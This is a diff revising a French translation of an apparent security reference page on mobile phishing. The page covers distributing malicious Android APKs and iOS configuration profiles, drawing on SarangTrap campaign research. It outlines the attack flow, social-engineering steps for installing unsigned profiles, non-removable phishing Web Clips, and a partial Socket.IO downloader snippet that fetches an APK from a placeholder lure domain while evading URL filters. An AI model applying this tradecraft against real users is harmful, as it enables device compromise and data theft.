@@ -1,51 +1,49 @@
 # Phishing mobile et distribution d'applications malveillantes (Android et iOS)
 
-{{#include ../../banners/hacktricks-training.md}}
-
 > [!INFO]
-> Cette page couvre les techniques utilisées par les acteurs malveillants pour distribuer des **APK Android malveillants** et des **profils de configuration mobiles iOS** par le biais du phishing (SEO, ingénierie sociale, faux stores, applications de rencontre, etc.).
+> Cette page couvre les techniques utilisées par les acteurs malveillants pour distribuer des **APK Android malveillants** et des **profils de configuration mobiles iOS** via le phishing (SEO, ingénierie sociale, fausses boutiques, applications de rencontre, etc.).
 > Le contenu est adapté de la campagne SarangTrap révélée par Zimperium zLabs (2025) et d'autres recherches publiques.<sup>[[1]](#references)</sup>
 
 ## Flux d'attaque
 
-1. **Infrastructure SEO/Phishing**
-* Enregistrer des dizaines de domaines similaires (rencontres, partage cloud, service automobile…).
-– Utiliser des mots-clés dans la langue locale et des emojis dans l'élément `<title>` pour apparaître dans Google.
+1. **Infrastructure SEO/phishing**
+* Enregistrer des dizaines de domaines similaires (rencontre, partage cloud, service automobile…).
+– Utiliser des mots-clés en langue locale et des emojis dans l'élément `<title>` pour être mieux classé dans Google.
 – Héberger les instructions d'installation Android (`.apk`) et iOS sur la même landing page.
 2. **Téléchargement de la première étape**
-* Android : lien direct vers un APK *non signé* ou provenant d'un « store tiers ».
+* Android : lien direct vers un APK *unsigned* ou provenant d'une « third-party store ».
 * iOS : lien `itms-services://` ou HTTPS simple vers un profil **mobileconfig** malveillant (voir ci-dessous).
-3. **Comportement post-installation Android**
-* L'exécution contrôlée par C2, l'abus des permissions, les contournements de dropper, la collecte en arrière-plan et les autres comportements de malware post-installation sont décrits dans la page dédiée Android Malware Post-Exploitation ci-dessous.
-4. **Technique de livraison iOS**
+3. **Comportement Android post-installation**
+* L'exécution contrôlée par le C2, l'abus des permissions, les contournements de dropper, la collecte en arrière-plan et autres comportements malware post-installation sont décrits dans la page dédiée Android Malware Post-Exploitation ci-dessous.
+4. **Technique de distribution iOS**
 * Un seul **profil de configuration mobile** peut demander `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration`, etc., afin d'inscrire l'appareil dans une supervision de type « MDM ».
 * Instructions d'ingénierie sociale :
 1. Ouvrir Réglages ➜ *Profil téléchargé*.
 2. Appuyer trois fois sur *Installer* (captures d'écran sur la page de phishing).
-3. Faire confiance au profil non signé ➜ l'attaquant obtient les droits d'accès aux *Contacts* et aux *Photos* sans contrôle de l'App Store.
-5. **Payload Web Clip iOS (icône d'application de phishing)**
-* Les payloads `com.apple.webClip.managed` peuvent **épingler une URL de phishing sur l'écran d'accueil** avec une icône et un libellé personnalisés.
-* Les Web Clips peuvent s'exécuter en **plein écran** (ce qui masque l'interface du navigateur) et être marqués comme **non supprimables**, obligeant la victime à supprimer le profil pour retirer l'icône.<sup>[[3]](#references)</sup>
+3. Faire confiance au profil unsigned ➜ l'attaquant obtient les droits *Contacts* et *Photos* sans contrôle de l'App Store.
+5. **Payload iOS Web Clip (icône d'application de phishing)**
+* Les payloads `com.apple.webClip.managed` peuvent **épingler une URL de phishing sur l'écran d'accueil** avec une icône/un libellé aux couleurs de la marque.
+* Les Web Clips peuvent s'exécuter en **plein écran** (masquant l'interface du navigateur) et être marqués comme **non supprimables**, obligeant la victime à supprimer le profil pour retirer l'icône.<sup>[[3]](#references)</sup>
 6. **Couche réseau**
 * HTTP simple, souvent sur le port 80 avec un en-tête HOST tel que `api.<phishingdomain>.com`.
 * `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (pas de TLS → facilement repérable).
 
 ## Android Malware Post-Exploitation
 
-Pour les techniques de malware Android post-installation telles que C2, l'abus d'Accessibility, les overlays, l'automatisation ATS, le chargement de DEX par étapes, les SMS surtaxés et la persistance, voir la page Android Malware Post-Exploitation dédiée ci-dessous :
+Pour les techniques Android malware post-installation telles que le C2, l'abus d'Accessibility, les overlays, l'automatisation ATS, le chargement de DEX par étapes, les SMS surtaxés et la persistence, voir la page Android Malware Post-Exploitation dédiée ci-dessous.
 
 {{#ref}}
 ../basic-forensic-methodology/android-malware-post-exploitation.md
 {{#endref}}
 
-## APK Smuggling basé sur Socket.IO/WebSocket + fausses pages Google Play
+## Smuggling d'APK basé sur Socket.IO/WebSocket + fausses pages Google Play
 
-Les attaquants remplacent de plus en plus les liens APK statiques par un canal Socket.IO/WebSocket intégré à des leurres ressemblant à Google Play. Cela dissimule l'URL du payload, contourne les filtres d'URL et d'extension et préserve une expérience d'installation réaliste.<sup>[[2]](#references)[[4]](#references)</sup>
+Les attaquants remplacent de plus en plus les liens APK statiques par un canal Socket.IO/WebSocket intégré à des leurres ressemblant à Google Play. Cela dissimule l'URL du payload, contourne les filtres d'URL/d'extension et conserve une UX d'installation réaliste.<sup>[[2]](#references)[[4]](#references)</sup>
 
 Flux client typique observé dans la nature :
 
 <details>
-<summary>Faux downloader Play basé sur Socket.IO (JavaScript)</summary>
+<summary>Faux téléchargeur Play basé sur Socket.IO (JavaScript)</summary>
 ```javascript
 // Open Socket.IO channel and request payload
 const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
@@ -67,10 +65,10 @@ document.body.appendChild(a); a.click();
 ```
 </details>
 
-Pourquoi il contourne les contrôles simples :
-- Aucune URL statique d’APK n’est exposée ; le payload est reconstruit en mémoire à partir de frames WebSocket.
-- Les filtres d’URL/MIME/extension qui bloquent les réponses directes en .apk peuvent ne pas détecter les données binaires transportées via WebSockets/Socket.IO.
-- Les crawlers et les sandbox d’URL qui n’exécutent pas les WebSockets ne récupéreront pas le payload.
+Pourquoi il échappe aux contrôles simples :
+- Aucune URL statique d’APK n’est exposée ; le payload est reconstruit en mémoire à partir de trames WebSocket.
+- Les filtres d’URL/MIME/extension qui bloquent les réponses directes en .apk peuvent ne pas détecter les données binaires acheminées via WebSockets/Socket.IO.
+- Les crawlers et les URL sandboxes qui n’exécutent pas les WebSockets ne récupéreront pas le payload.
 
 Voir également le tradecraft et les outils WebSocket :
 
@@ -79,11 +77,10 @@ Voir également le tradecraft et les outils WebSocket :
 {{#endref}}
 
 
-## Références
+## References
 
-- [1] [The Dark Side of Romance: campagne d’extorsion SarangTrap](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
+- [1] [Le côté obscur de la romance : campagne d’extorsion SarangTrap](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
 - [2] [Socket.IO](https://socket.io)
-- [3] [Paramètres du payload Web Clips pour les appareils Apple](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
+- [3] [Paramètres de payload Web Clips pour les appareils Apple](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
 - [4] [Cheval de Troie bancaire ciblant les utilisateurs Android indonésiens et vietnamiens](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
-
 {{#include ../../banners/hacktricks-training.md}}
